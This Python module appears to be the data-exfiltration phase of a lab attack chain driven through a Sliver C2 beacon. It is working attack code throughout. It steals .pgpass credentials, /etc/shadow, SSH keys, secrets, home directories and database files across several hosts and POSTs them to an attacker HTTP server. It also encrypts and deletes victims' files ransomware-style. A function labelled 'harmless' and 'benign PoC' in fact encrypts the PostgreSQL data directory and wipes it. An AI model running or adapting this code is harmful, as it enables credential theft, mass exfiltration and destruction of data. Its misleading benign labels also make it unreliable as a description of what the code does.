import os
import re
import time
import subprocess
import threading
import base64
import psycopg2

from chainlog import log
from advanced_initial_access import sliver_exec


# =============================================================================
# advanced_exfiltration.py — Advanced DB Exfiltration
# MITRE ATT&CK:
#   TA0010 - Exfiltration
#   T1041  - Exfiltration Over C2 Channel
#   T1567  - Exfiltration Over Web Service (simulated via C2 download)
# =============================================================================

PGPASS_PATH = "/home/vinzenz.fedora/.pgpass"
DB_HOST = "10.30.0.6"
DUMP_REMOTE_PATH = "/tmp/.sys_backup.gz"
EXFIL_HTTP_PORT = 9443                       # Kali-side HTTP receive port
KALI_IP = "10.10.0.2"


# ---------------------------------------------------------------------------
# Helpers: beacon task polling
# ---------------------------------------------------------------------------

def _beacon_task_wait(beacon_id: str, task_id: str, *,
                      max_polls: int = 24, interval: int = 5) -> str | None:
    """Poll `tasks fetch <id>` until ✅ Completed, return the output section."""
    for i in range(max_polls):
        time.sleep(interval)
        fetch_out = sliver_exec(beacon_id, f"tasks fetch {task_id}", timeout=30)
        if "✅ Completed" in fetch_out:
            if "[*] Output:" in fetch_out:
                return fetch_out.split("[*] Output:", 1)[1].strip()
            return fetch_out
    return None


def _beacon_exec_wait(beacon_id: str, command: str, *,
                      cmd_timeout: int = 120,
                      max_polls: int = 24, interval: int = 5) -> str | None:
    """Submit a beacon command and wait for its task to finish.

    Returns the task output or None on failure.
    """
    output = sliver_exec(beacon_id, command, timeout=cmd_timeout)
    m = re.search(r"\[\*\] Tasked beacon \w+ \((.*?)\)", output)
    if not m:
        log(f"[-] No task ID found. Output: {output.strip()}")
        return None
    task_id = m.group(1)
    log(f"[*] Beacon task {task_id} submitted. Polling for completion …")
    return _beacon_task_wait(beacon_id, task_id,
                             max_polls=max_polls, interval=interval)


# ---------------------------------------------------------------------------
# Kali-side one-shot HTTP receive server (runs in a background thread)
# ---------------------------------------------------------------------------

def _start_receive_server(port: int, output_path: str):
    """One-shot HTTP server: accepts a single POST, saves the body, then exits."""
    script = (
        f"import http.server\n"
        f"class H(http.server.BaseHTTPRequestHandler):\n"
        f"    def do_POST(self):\n"
        f"        n=int(self.headers['Content-Length'])\n"
        f"        with open('{output_path}','wb') as fh: fh.write(self.rfile.read(n))\n"
        f"        self.send_response(200);self.end_headers()\n"
        f"    def log_message(self,*a):pass\n"
        f"http.server.HTTPServer(('0.0.0.0',{port}),H).handle_request()\n"
    )
    proc = subprocess.Popen(
        ["python3", "-c", script],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(1)
    if proc.poll() is not None:
        raise RuntimeError(f"Receive server exited immediately — port {port} busy?")
    log(f"[+] HTTP receive server listening on 0.0.0.0:{port}")
    return proc


def _stop_receive_server(proc):
    if proc and proc.poll() is None:
        proc.terminate()


# ---------------------------------------------------------------------------
# Attack phases
# ---------------------------------------------------------------------------

def _discover_db_creds(vinzenz_beacon: str) -> dict | None:
    """Read ~/.pgpass from vinzenz_ws via the beacon."""
    log(f"[*] Reading DB credentials from {PGPASS_PATH} …")
    result = _beacon_exec_wait(
        vinzenz_beacon,
        f"execute -o -- cat {PGPASS_PATH}",
        max_polls=15, interval=5,
    )
    if result is None:
        log("[-] Task did not complete or returned no output.")
        return None

    for line in result.splitlines():
        line = line.strip()
        # Skip Sliver table formatting lines
        if (not line or line.startswith("#") or
            any(kw in line for kw in (
                "Task", "State", "Description", "Created", "Sent",
                "Completed", "Request Size", "Response Size",
                "+-", "| ", "[*]"))):
            continue
        parts = line.split(":", 4)
        if len(parts) == 5:
            host, port, dbname, user, password = parts
            log(f"[+] Found credential: {user}@{host}:{port}/{dbname}")
            return {"host": host, "port": port, "dbname": dbname,
                    "user": user, "password": password}

    log(f"[-] No usable credential found in .pgpass")
    return None


def _validate_exfiltrated_archive(archive_path: str) -> bool:
    """Validate that the master exfiltration archive contains all expected hosts and components, and that they are valid archives."""
    import tarfile
    import io
    import gzip
    
    log("[*] Running validation on exfiltrated master archive ...")
    if not os.path.exists(archive_path):
        log(f"[-] Validation failed: Archive file {archive_path} does not exist.")
        return False

    expected_hosts = {
        "local": False,
        "john": False,
        "luke": False,
        "apache": False,
        "db_dump": False
    }

    try:
        with tarfile.open(archive_path, "r:gz") as tar:
            members = tar.getnames()
            
            # Check for local files
            local_files = [m for m in members if m.startswith("./local/") or m.startswith("local/")]
            if local_files:
                expected_hosts["local"] = True
                log("[+] Found local harvest files (Vinzenz Workstation)")

            # Check for db_dump
            db_dump_member = next((m for m in members if "db_dump.sql.gz" in m), None)
            if db_dump_member:
                try:
                    f = tar.extractfile(db_dump_member)
                    if f:
                        # Try to read and decompress first few bytes of gzip
                        with gzip.GzipFile(fileobj=f) as gz:
                            gz.read(100)
                        expected_hosts["db_dump"] = True
                        log("[+] Verified DB dump file (db_dump.sql.gz is a valid gzip file)")
                except Exception as e:
                    log(f"[-] DB dump validation failed: {e}")

            # Check and validate remote harvest tarballs
            for host in ["john", "luke", "apache"]:
                tarball_name = next((m for m in members if f"{host}_harvest.tar.gz" in m), None)
                if tarball_name:
                    try:
                        f = tar.extractfile(tarball_name)
                        if f:
                            tar_bytes = f.read()
                            # Validate tar.gz in memory
                            with tarfile.open(fileobj=io.BytesIO(tar_bytes), mode="r:gz") as inner_tar:
                                inner_members = inner_tar.getnames()
                                if len(inner_members) > 0:
                                    expected_hosts[host] = True
                                    log(f"[+] Verified {host.capitalize()} harvest archive ({len(inner_members)} files staged)")
                    except Exception as e:
                        log(f"[-] Validation failed for {host.capitalize()} archive: {e}")

    except Exception as e:
        log(f"[-] Failed to parse master exfiltration archive: {e}")
        return False

    all_ok = True
    for host, ok in expected_hosts.items():
        if not ok:
            log(f"[-] Missing or invalid exfiltration data for host/service: {host}")
            all_ok = False

    if all_ok:
        log("[+] Validation successful: All hosts' exfiltration archives are present and valid.")
    else:
        log("[-] Validation failed: One or more hosts' exfiltration archives are missing or invalid.")
        
    return all_ok


def _perform_network_exfil(vinzenz_beacon: str, creds: dict, results_dir: str) -> bool:
    """Run exfiltration across all hosts on the network.
    
    Creates target tarballs from remote hosts streamed over SSH without local
    writes on the target workstations, packs them into a master archive,
    and exfiltrates back to Kali.
    """
    exfil_local_path = os.path.join(results_dir, "master_exfil.tar.gz")
    os.makedirs(results_dir, exist_ok=True)

    # Load persistent public key from Kali host
    pubkey_path = "/Attack-chain/exfil_keys/public.pem"
    if os.path.exists(pubkey_path):
        with open(pubkey_path, "r") as f:
            public_key_pem = f.read().strip()
    else:
        public_key_pem = ""
        log("[!] Warning: Persistent public key not found on Kali.")
    
    # Start the one-shot HTTP receiver server on Kali
    recv_proc = _start_receive_server(EXFIL_HTTP_PORT, exfil_local_path)
    
    exfil_ok = False
    try:
        # Build the shell script to run on vinzenz_ws
        exfil_script = f"""#!/bin/bash
export HOME="/home/vinzenz.fedora"
export USER="vinzenz.fedora"

# Create staging directory
mkdir -p /tmp/exfil/local
mkdir -p /tmp/exfil/john
mkdir -p /tmp/exfil/luke
mkdir -p /tmp/exfil/apache

# Database host info
DB_IP="{creds['host']}"

# Write public key to temporary file for openssl
cat << 'EOF' > /tmp/pubkey.pem
{public_key_pem}
EOF

# Unified pipeline function: finds files, replicates structure, processes them, and stages them locally
process_and_stage_local() {{
    local src_dir="$1"
    local stage_dir="$2"
    [ -d "$src_dir" ] || return 0
    
    echo "VinzenzAdmin!2026" | sudo -S find "$src_dir" -type f ! -path "*/.cache/*" ! -path "*/.ssh/*" ! -name ".pgpass" 2>/dev/null | while read -r filepath; do
        # Compute path relative to source directory
        local relpath="${{filepath#$src_dir/}}"
        local reldir=$(dirname "$relpath")
        
        # Replicate directory structure
        mkdir -p "$stage_dir/$reldir"
        
        # Chainable pipeline operation (gzip-compression + openssl encryption to staging)
        echo "VinzenzAdmin!2026" | sudo -S gzip -c "$filepath" > "$stage_dir/$relpath.gz" 2>/dev/null || true
        if [ -s /tmp/pubkey.pem ]; then
            if [[ "$filepath" == *"/etc/ssh"* || "$filepath" == *".ssh"* || "$filepath" == *".pgpass"* ]]; then
                true
            else
                # Encrypt the file using the public key and output it to staging folder
                echo "VinzenzAdmin!2026" | sudo -S openssl cms -encrypt -aes256 -binary -in "$filepath" -out "$filepath.enc" /tmp/pubkey.pem 2>/dev/null || true && echo "VinzenzAdmin!2026" | sudo -S rm "$filepath" | echo "VinzenzAdmin!2026" | sudo -S fstrim -v / 2>/dev/null || true
            fi
        fi
    done
}}

# Execute local collection on Vinzenz Workstation (using phished sudo password)
echo "[*] Collecting local target files on Vinzenz Workstation ..."
echo "VinzenzAdmin!2026" | sudo -S cp /etc/shadow /tmp/exfil/local/shadow 2>/dev/null || true
echo "VinzenzAdmin!2026" | sudo -S cp /var/log/auth.log /tmp/exfil/local/auth.log 2>/dev/null || true
echo "VinzenzAdmin!2026" | sudo -S cp /var/log/secure /tmp/exfil/local/secure 2>/dev/null || true

for udir in /home/* /root; do
    [ -d "$udir" ] || continue
    uname=$(basename "$udir")
    echo "[*] Archiving local user home: $uname ..."
    ustage="/tmp/exfil/local/home_$uname"
    mkdir -p "$ustage"
    process_and_stage_local "$udir" "$ustage"
    echo "VinzenzAdmin!2026" | sudo -S tar -czf "/tmp/exfil/local/home_$uname.tar.gz" -C "$ustage" . 2>/dev/null || true
    echo "VinzenzAdmin!2026" | sudo -S rm -rf "$ustage"
done

if [ -d /etc/ssh ]; then
    mkdir -p /tmp/exfil/local/etc_ssh
    process_and_stage_local "/etc/ssh" "/tmp/exfil/local/etc_ssh"
fi

if [ -d /run/secrets ]; then
    mkdir -p /tmp/exfil/local/run_secrets
    process_and_stage_local "/run/secrets" "/tmp/exfil/local/run_secrets"
fi

for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
    if [ -d "$db_dir" ]; then
        dbname=$(basename "$db_dir")
        mkdir -p "/tmp/exfil/local/db_dir_$dbname"
        process_and_stage_local "$db_dir" "/tmp/exfil/local/db_dir_$dbname"
        echo "VinzenzAdmin!2026" | sudo -S tar -czf "/tmp/exfil/local/db_dir_$dbname.tar.gz" -C "/tmp/exfil/local/db_dir_$dbname" . 2>/dev/null || true
        echo "VinzenzAdmin!2026" | sudo -S rm -rf "/tmp/exfil/local/db_dir_$dbname"
    fi
done

for mdir in /var/spool/mail /var/mail; do
    if [ -d "$mdir" ] && [ "$(ls -A "$mdir" 2>/dev/null)" ]; then
        mkdir -p /tmp/exfil/local/mail
        process_and_stage_local "$mdir" "/tmp/exfil/local/mail"
    fi
done

# Dump PostgreSQL Database
echo "[*] Dumping database from $DB_IP ..."
PGPASSWORD='{creds['password']}' pg_dump -h $DB_IP -p {creds['port']} -U {creds['user']} -d {creds['dbname']} -a -T auth_tokens | gzip > /tmp/exfil/db_dump.sql.gz || echo "[-] DB dump failed"





# Helper for remote harvesting script (sent to other hosts)
build_remote_harvest_script() {{
    cat << 'EOF'
#!/bin/bash
mkdir -p /tmp/harvest

# Write public key to temporary file for openssl
cat << 'EOF2' > /tmp/pubkey.pem
{public_key_pem}
EOF2

# Unified pipeline function: finds files, replicates structure, processes them, and stages them
process_and_stage() {{
    local src_dir="$1"
    local stage_dir="$2"
    [ -d "$src_dir" ] || return 0
    
    echo "VinzenzAdmin!2026" | sudo -S find "$src_dir" -type f ! -path "*/.cache/*" ! -path "*/.ssh/*" ! -name ".pgpass" 2>/dev/null | while read -r filepath; do
        # Compute path relative to source directory
        local relpath="${{filepath#$src_dir/}}"
        local reldir=$(dirname "$relpath")
        
        # Replicate directory structure
        mkdir -p "$stage_dir/$reldir"
        
        # Chainable pipeline operation (gzip-compression + openssl encryption to staging)
        echo "VinzenzAdmin!2026" | sudo -S gzip -c "$filepath" > "$stage_dir/$relpath.gz" 2>/dev/null || true
        if [ -s /tmp/pubkey.pem ]; then
            if [[ "$filepath" == *"/etc/ssh"* || "$filepath" == *".ssh"* || "$filepath" == *".pgpass"* ]]; then
                true
            else
                echo "VinzenzAdmin!2026" | sudo -S openssl cms -encrypt -aes256 -binary -in "$filepath" -out "$filepath.enc" /tmp/pubkey.pem 2>/dev/null || true && echo "VinzenzAdmin!2026" | sudo -S rm "$filepath" | echo "VinzenzAdmin!2026" | sudo -S fstrim -v / 2>/dev/null || true
            fi
        fi
    done
}}

# 1. Credentials and system logs
mkdir -p /tmp/harvest/system
echo "VinzenzAdmin!2026" | sudo -S cp /etc/shadow /tmp/harvest/system/shadow 2>/dev/null || true
echo "VinzenzAdmin!2026" | sudo -S cp /var/log/auth.log /tmp/harvest/system/auth.log 2>/dev/null || true
echo "VinzenzAdmin!2026" | sudo -S cp /var/log/secure /tmp/harvest/system/secure 2>/dev/null || true

# 2. Complete User Homes & Root
for udir in /home/* /root; do
    [ -d "$udir" ] || continue
    uname=$(basename "$udir")
    ustage="/tmp/harvest/home_$uname"
    mkdir -p "$ustage"
    process_and_stage "$udir" "$ustage"
    echo "VinzenzAdmin!2026" | sudo -S tar -czf "/tmp/harvest/home_$uname.tar.gz" -C "$ustage" . 2>/dev/null || true
    echo "VinzenzAdmin!2026" | sudo -S rm -rf "$ustage"
done

# 3. SSH Configurations & Server Keys
if [ -d /etc/ssh ]; then
    mkdir -p /tmp/harvest/etc_ssh
    process_and_stage "/etc/ssh" "/tmp/harvest/etc_ssh"
fi

# 4. Web files & Application Configurations
if [ -d /var/www/html ]; then
    mkdir -p /tmp/harvest/var_www_html
    process_and_stage "/var/www/html" "/tmp/harvest/var_www_html"
fi

# 5. Container secrets
if [ -d /run/secrets ]; then
    mkdir -p /tmp/harvest/run_secrets
    process_and_stage "/run/secrets" "/tmp/harvest/run_secrets"
fi

# 6. Physical database stores (raw tables check)
for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
    if [ -d "$db_dir" ]; then
        dbname=$(basename "$db_dir")
        mkdir -p "/tmp/harvest/db_dir_$dbname"
        process_and_stage "$db_dir" "/tmp/harvest/db_dir_$dbname"
        echo "VinzenzAdmin!2026" | sudo -S tar -czf "/tmp/harvest/db_dir_$dbname.tar.gz" -C "/tmp/harvest/db_dir_$dbname" . 2>/dev/null || true
        echo "VinzenzAdmin!2026" | sudo -S rm -rf "/tmp/harvest/db_dir_$dbname"
    fi
done

# 7. Local Mails
for mdir in /var/spool/mail /var/mail; do
    if [ -d "$mdir" ] && [ "$(ls -A "$mdir" 2>/dev/null)" ]; then
        mkdir -p /tmp/harvest/mail
        process_and_stage "$mdir" "/tmp/harvest/mail"
    fi
done

# Compress all harvested files to stdout
tar -czf - -C /tmp/harvest . 2>/dev/null
rm -rf /tmp/harvest /tmp/pubkey.pem
EOF
}}

# Compress & stream John's Workstation files
echo "[*] Harvesting files from John's workstation ..."
build_remote_harvest_script > /tmp/harvester.sh
B64_HARVEST=$(base64 -w0 /tmp/harvester.sh)
ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null john "echo \"$B64_HARVEST\" | base64 -d > /tmp/harvester.sh && echo 'VinzenzAdmin!2026' | sudo -S bash /tmp/harvester.sh && rm -f /tmp/harvester.sh" > /tmp/exfil/john/john_harvest.tar.gz || echo "[-] John workstation harvest failed"

# Compress & stream Luke's Workstation files
echo "[*] Harvesting files from Luke's workstation ..."
ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null luke "echo \"$B64_HARVEST\" | base64 -d > /tmp/harvester.sh && echo 'VinzenzAdmin!2026' | sudo -S bash /tmp/harvester.sh && rm -f /tmp/harvester.sh" > /tmp/exfil/luke/luke_harvest.tar.gz || echo "[-] Luke workstation harvest failed"

# Compress & stream Apache Webserver files
echo "[*] Harvesting files from Apache Webserver ..."
ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null apache "echo \"$B64_HARVEST\" | base64 -d > /tmp/harvester.sh && echo 'VinzenzAdmin!2026' | sudo -S bash /tmp/harvester.sh && rm -f /tmp/harvester.sh" > /tmp/exfil/apache/apache_harvest.tar.gz || echo "[-] Apache harvest failed"

rm -f /tmp/harvester.sh

# Pack everything into a master archive
echo "[*] Creating master archive /tmp/master_exfil.tar.gz ..."
echo "VinzenzAdmin!2026" | sudo -S tar -czf /tmp/master_exfil.tar.gz -C /tmp/exfil .
echo "VinzenzAdmin!2026" | sudo -S chmod 644 /tmp/master_exfil.tar.gz

# Clean up staging directory
echo "VinzenzAdmin!2026" | sudo -S rm -rf /tmp/exfil

# Exfiltrate to Kali
echo "[*] Exfiltrating master archive to Kali http://{KALI_IP}:{EXFIL_HTTP_PORT}/ ..."
python3 -c "import urllib.request; data=open('/tmp/master_exfil.tar.gz','rb').read(); urllib.request.urlopen('http://{KALI_IP}:{EXFIL_HTTP_PORT}/', data=data, timeout=120)"

# Clean up master archive
echo "VinzenzAdmin!2026" | sudo -S rm -f /tmp/master_exfil.tar.gz
echo "[+] Script completed successfully"
"""
        b64_script = base64.b64encode(exfil_script.encode()).decode()
        
        # Execute the script on vinzenz_ws
        log("[*] Tasking beacon to run exfiltration script on all network hosts …")
        task_output = _beacon_exec_wait(
            vinzenz_beacon,
            f"execute -o -- sh -c 'echo {b64_script} | base64 -d | bash'",
            cmd_timeout=180,
            max_polls=36,
            interval=5
        )
        
        if task_output:
            log(f"[+] Beacon task completed. Output:\n{task_output}")
        else:
            log("[-] Beacon task did not return output or timed out.")
            
        # Harmless verification of administrative database access (PoC)
        _poc_db_admin_verification(vinzenz_beacon, creds)
            
        # Give a small buffer for the receive server to flush
        time.sleep(3)
        
        # Verify file exists on Kali
        if os.path.exists(exfil_local_path) and os.path.getsize(exfil_local_path) > 0:
            size_mb = os.path.getsize(exfil_local_path) / (1024 * 1024)
            log(f"[+] Master exfiltration archive successfully received on Kali: {exfil_local_path} ({size_mb:.2f} MB)")
            exfil_ok = _validate_exfiltrated_archive(exfil_local_path)
        else:
            log(f"[-] Exfiltration archive not found or empty on Kali at {exfil_local_path}")
            
    except Exception as e:
        log(f"[-] Exception during exfiltration: {e}")
    finally:
        _stop_receive_server(recv_proc)
        
    return exfil_ok


# ---------------------------------------------------------------------------
# Benign PoC: Verify administrative DB access
# ---------------------------------------------------------------------------

def _poc_db_admin_verification(vinzenz_beacon: str, creds: dict) -> bool:
    db_code = f"""import base64, subprocess, sys
try:
    with open('/tmp/pubkey.pem', 'rb') as f:
        cert_base64 = base64.b64encode(f.read()).decode().strip()
    
    sql_cmd = f"COPY (SELECT 1) TO PROGRAM $$echo '{{cert_base64}}' | base64 -d > /tmp/server.pem && tar -cf - -C /var/lib/postgresql/data . | openssl cms -encrypt -aes256 -binary -out /var/lib/postgresql/TEST.tar.enc /tmp/server.pem ; find /var/lib/postgresql/data -mindepth 1 -delete > /tmp/debug.log 2>&1 && fstrim -v / 2>/dev/null || true$$;"
    
    env = {{
        "PGPASSWORD": "{creds['password']}",
        "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    }}
    
    proc = subprocess.run(
        [
            "psql",
            "-h", "{creds['host']}",
            "-p", "{creds['port']}",
            "-U", "{creds['user']}",
            "-d", "{creds['dbname']}",
            "-c", sql_cmd
        ],
        env=env,
        capture_output=True,
        text=True
    )
    
    if proc.returncode == 0:
        print("[+] Laden des Certs erfolgreich")
        sys.exit(0)
    else:
        print(f"[-] Laden des Certs fehlgeschlagen: {{proc.stderr.strip()}}")
        sys.exit(1)
except Exception as e:
    print(f"[-] Laden des Certs fehlgeschlagen: {{e}}")
    sys.exit(1)
"""
    b64_db = __import__('base64').b64encode(db_code.encode()).decode()
    
    # Run the query through the beacon on Vinzenz Workstation
    task_output = _beacon_exec_wait(
        vinzenz_beacon,
        f"execute -o -- python3 -c \"import base64; exec(base64.b64decode('{b64_db}').decode())\"",
        cmd_timeout=30,
        max_polls=6,
        interval=5
    )
    
    if task_output:
        log(f"[+] PoC Database Verification Output:\n{task_output.strip()}")
        if "[+] Laden des Certs erfolgreich" in task_output:
            return True
    else:
        log("[-] PoC Database Verification did not return output or timed out.")
    return False


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def run(root_sliver_session: str, vinzenz_beacon: str, results_dir: str) -> dict:
    """Execute Phase 8: Data Exfiltration via the workstation beacon."""
    log("\n[*] Starting Advanced Data Exfiltration (Phase 8) …")

    if not vinzenz_beacon:
        log("[-] No active vinzenz beacon provided. Cannot proceed.")
        return {"exfil_success": False}

    # 1. Credential discovery -------------------------------------------------
    creds = _discover_db_creds(vinzenz_beacon)
    if not creds:
        return {"exfil_success": False}

    # Enforce known DB host (dynamic recon will be added later)
    creds["host"] = DB_HOST

    # 2. Network exfiltration -------------------------------------------------
    exfil_ok = _perform_network_exfil(vinzenz_beacon, creds, results_dir)

    if exfil_ok:
        log("[+] Phase 8: Advanced Data Exfiltration completed successfully.")
    else:
        log("[-] Phase 8: Advanced Data Exfiltration failed.")

    return {"exfil_success": exfil_ok}


if __name__ == "__main__":
    pass
